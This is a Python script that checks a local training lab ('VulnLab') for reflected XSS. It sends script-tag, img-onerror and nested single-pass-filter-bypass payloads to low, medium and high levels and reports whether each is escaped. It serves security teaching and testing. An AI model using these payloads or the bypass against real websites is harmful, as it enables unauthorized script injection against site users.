#!/usr/bin/env python3
"""VulnLab XSS 场景自动验证脚本（零第三方依赖）。

与 `poc_sqli.py` 保持同一套结构：命令式脚本用于展示完整推导，
声明式 YAML PoC 用于交给扫描引擎批量执行。

设计要点：**用唯一标记串而不是通用的 alert(1)**。

靶场页面本身会展示示例载荷（已转义），如果用 `alert(1)` 做检测特征，
「示例载荷表」和「实际输出」两处都会命中，无法区分是漏洞还是页面文本。
用随机标记串可以彻底排除这种混淆 —— 开发时真的踩过这个坑。

用法:
    python poc_xss.py                          # 默认 127.0.0.1:8080
    python poc_xss.py --url http://lab:8080
    python poc_xss.py --json

⚠️ 仅用于本地 / 授权环境。
"""

from __future__ import annotations

import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field

TIMEOUT = 10

#: 唯一标记串 —— 避免与页面上的示例文本混淆
MARKER = "VULNLAB_XSS_MARKER"


def http_get(url: str, timeout: float = TIMEOUT) -> tuple[int, str]:
    """发 GET 请求，返回 (状态码, 正文)。失败返回 (0, 错误信息)。"""
    request = urllib.request.Request(
        url, headers={"User-Agent": "VulnLab-PoC/1.0 (authorized-lab-only)"}
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return response.status, response.read().decode("utf-8", errors="ignore")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", errors="ignore")
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return 0, f"__CONNECTION_ERROR__: {exc}"


def build_url(base: str, path: str, payload: str) -> str:
    """构造带载荷的 URL。载荷做完整百分号编码，避免被 HTTP 层提前处理。"""
    return f"{base.rstrip('/')}{path}?{urllib.parse.urlencode({'name': payload})}"


@dataclass
class Finding:
    name: str
    vulnerable: bool
    detail: str = ""
    payload: str = ""
    evidence: str = field(default="")

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "vulnerable": self.vulnerable,
            "detail": self.detail,
            "payload": self.payload,
            "evidence": self.evidence,
        }


# ------------------------------------------------------------------ 载荷

#: 不含 script 标签的载荷 —— 用于测试「黑名单是否只堵了 script」
IMG_PAYLOAD = f'<img src=x onerror=alert("{MARKER}")>'

#: 嵌套载荷 —— 利用单次替换把危险片段拼回来。
#:
#: 构造思路（容易算错，这里推导一遍）：
#:   过滤器删除 `<script`，所以我们希望删除之后能拼回 `<script>`。
#:   把目标切成三段：`<scr` + `<script` + `ipt>`
#:   其中 `<script` 会被删掉，剩下的 `<scr` + `ipt>` 正好拼回 `<script>`。
#:
#:   ⚠️ 常见误区：写成 `<scr<script>ipt>` 是无效的 ——
#:   它的字符是 `<scr` + `<script` + `>ipt>`，删掉后变成 `<scr>ipt>`，
#:   而不是 `<script>`。多出来的那个 `>` 会破坏拼接。
#:
#: 闭合标签同理：`</scr` + `</script` + `ipt>` → `</script>`
NESTED_PAYLOAD = f'<scr<scriptipt>alert("{MARKER}")</scr</scriptipt>'

#: 基础载荷
SCRIPT_PAYLOAD = f'<script>alert("{MARKER}")</script>'


# ------------------------------------------------------------------ 检测


def _find_unescaped(body: str, expected: str) -> tuple[bool, str]:
    """在响应中查找未转义的期望形态，返回 (是否找到, 上下文片段)。

    转义形态与未转义形态不会互相误匹配：

        未转义  <img src=x onerror=alert("VULNLAB_XSS_MARKER")>
        已转义  &lt;img src=x onerror=alert(&quot;VULNLAB_XSS_MARKER&quot;)&gt;

    这也是判据必须用「完整标签」而不是「出现了 onerror 这个词」的原因 ——
    页面上的示例载荷表、表单的 value 属性里都有转义后的同名词。
    """
    index = body.find(expected)
    if index < 0:
        return False, ""

    raw = body[max(0, index - 70) : index + len(expected) + 20]
    return True, " ".join(raw.split())


def _escaped_form(text: str) -> str:
    """把字符串转成 HTML 实体编码后的形态（用于判断「被转义」还是「没回显」）。"""
    return (
        text.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#039;")
    )


def check_level(
    base: str,
    level: str,
    payload: str,
    label: str,
    expected: str,
    *,
    expect_blocked: bool = False,
) -> Finding:
    """检测某一档对给定载荷的行为。

    Args:
        payload: 实际发送的载荷。
        expected: 期望在响应中出现的**未转义形态**。
            对嵌套绕过而言，这是「过滤之后的形态」而不是原始载荷 ——
            因为过滤器的输出才是最终拼进 HTML 的东西。
        expect_blocked: True 表示期望该载荷被过滤器拦下。
    """
    status, body = http_get(build_url(base, f"/xss/{level}.php", payload))

    if status != 200:
        return Finding(f"{level} 档 · {label}", False, f"HTTP {status}")

    found, snippet = _find_unescaped(body, expected)

    if expect_blocked:
        return Finding(
            f"{level} 档 · {label}",
            not found,
            "载荷被过滤器拦下，未以可执行形态输出" if not found else "★ 载荷未被拦下",
            payload,
            snippet,
        )

    if found:
        return Finding(
            f"{level} 档 · {label}",
            True,
            "载荷被未转义地输出，构成可执行标签",
            payload,
            snippet,
        )

    if _escaped_form(expected)[:24] in body:
        return Finding(
            f"{level} 档 · {label}", False, "载荷已被 HTML 实体编码（修复生效）"
        )
    return Finding(f"{level} 档 · {label}", False, "未找到未转义的回显")


def check_script_filter(base: str) -> Finding:
    """检查 medium 档的过滤器是否只针对 script 标签。

    这一条的结论是「过滤器存在，但覆盖面不足」—— 它不是漏洞判定，
    而是为后续「img 载荷能绕过」提供因果解释。
    """
    status, body = http_get(build_url(base, "/xss/medium.php", SCRIPT_PAYLOAD))

    if status != 200:
        return Finding("medium 档 · 过滤器行为", False, f"HTTP {status}")

    filtered_notice = "过滤器检测到敏感关键字" in body
    script_reflected = f'<script>alert("{MARKER}")</script>' in body

    if filtered_notice and not script_reflected:
        return Finding(
            "medium 档 · 过滤器行为",
            True,
            "过滤器确实拦下了 script 标签（但范围有限 —— 见下一条）",
            SCRIPT_PAYLOAD,
            "过滤器生效",
        )
    if script_reflected:
        return Finding(
            "medium 档 · 过滤器行为", True, "script 标签未被过滤", SCRIPT_PAYLOAD
        )
    return Finding("medium 档 · 过滤器行为", False, "未观察到明确的过滤行为")


def check_high_neutralized(base: str) -> Finding:
    """验证 high 档的修复是否生效：任何载荷都不该以未转义形态出现。"""
    # 两种可执行形态（嵌套绕过过滤后也会变成 script 形态）
    dangerous_forms = [
        (f'<script>alert("{MARKER}")</script>', "script 形态"),
        (f'<img src=x onerror=alert("{MARKER}")>', "img 形态"),
    ]

    for payload, label in [
        (SCRIPT_PAYLOAD, "script 载荷"),
        (IMG_PAYLOAD, "img 载荷"),
        (NESTED_PAYLOAD, "嵌套载荷"),
    ]:
        status, body = http_get(build_url(base, "/xss/high.php", payload))
        if status != 200:
            continue
        for form, form_label in dangerous_forms:
            found, snippet = _find_unescaped(body, form)
            if found:
                return Finding(
                    "high 档 · 修复有效性",
                    False,
                    f"★ 修复失效：{label} 以未转义形态（{form_label}）输出",
                    payload,
                    snippet,
                )

    return Finding(
        "high 档 · 修复有效性",
        False,
        "三种载荷均被正确编码，页面只把它当作显示文本",
        "",
        "htmlspecialchars 生效",
    )


# ------------------------------------------------------------------ 主流程


def run_checks(base: str) -> list[Finding]:
    status, _ = http_get(f"{base}/index.php")
    if status == 0:
        print(f"[环境错误] 无法连接 {base}", file=sys.stderr)
        print("           请先启动靶场：./start.sh 或 php -S 127.0.0.1:8080 -t html", file=sys.stderr)
        return []
    if status != 200:
        print(f"[环境错误] {base}/index.php 返回 HTTP {status}", file=sys.stderr)
        return []

    return [
        check_level(
            base, "low", SCRIPT_PAYLOAD, "script 载荷",
            f'<script>alert("{MARKER}")</script>',
        ),
        check_level(
            base, "low", IMG_PAYLOAD, "img 载荷",
            f'<img src=x onerror=alert("{MARKER}")>',
        ),
        check_script_filter(base),
        check_level(
            base, "medium", IMG_PAYLOAD, "img 载荷（绕过黑名单）",
            f'<img src=x onerror=alert("{MARKER}")>',
        ),
        # 嵌套载荷的期望形态是【过滤之后】的结果 —— 那才是最终拼进 HTML 的东西
        check_level(
            base, "medium", NESTED_PAYLOAD, "嵌套载荷（单次替换绕过）",
            f'<script>alert("{MARKER}")</script>',
        ),
        check_high_neutralized(base),
    ]


def print_report(base: str, findings: list[Finding]) -> None:
    print()
    print("=" * 78)
    print("  VulnLab XSS 场景验证报告")
    print(f"  目标: {base}")
    print("=" * 78)
    print()

    for finding in findings:
        if finding.name.startswith("high 档"):
            mark = "[✓ 修复]" if "htmlspecialchars" in finding.evidence else "[✗ 异常]"
        elif finding.name.endswith("过滤器行为"):
            mark = "[ 信息 ]" if finding.vulnerable else "[未确认]"
        else:
            mark = "[命中]" if finding.vulnerable else "[未命中]"

        print(f"{mark} {finding.name}")
        print(f"          {finding.detail}")
        if finding.payload:
            print(f"          payload: {finding.payload}")
        if finding.evidence:
            print(f"          证据:    {finding.evidence[:120]}")
        print()

    hits = [f for f in findings if f.vulnerable and not f.name.startswith("high 档")]
    print("-" * 78)
    print(f"命中项: {len(hits)} / {len([f for f in findings if '过滤器行为' not in f.name])}")
    print("-" * 78)
    print()


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="VulnLab XSS 场景自动验证（仅用于授权环境）")
    parser.add_argument("--url", default="http://127.0.0.1:8080", help="靶场地址")
    parser.add_argument("--json", action="store_true", help="以 JSON 输出")
    args = parser.parse_args(argv)

    findings = run_checks(args.url)
    if not findings:
        return 2

    if args.json:
        print(json.dumps(
            {"target": args.url, "findings": [f.to_dict() for f in findings]},
            ensure_ascii=False, indent=2,
        ))
    else:
        print_report(args.url, findings)

    return 1 if any(f.vulnerable for f in findings if not f.name.startswith("high")) else 0


if __name__ == "__main__":
    sys.exit(main())
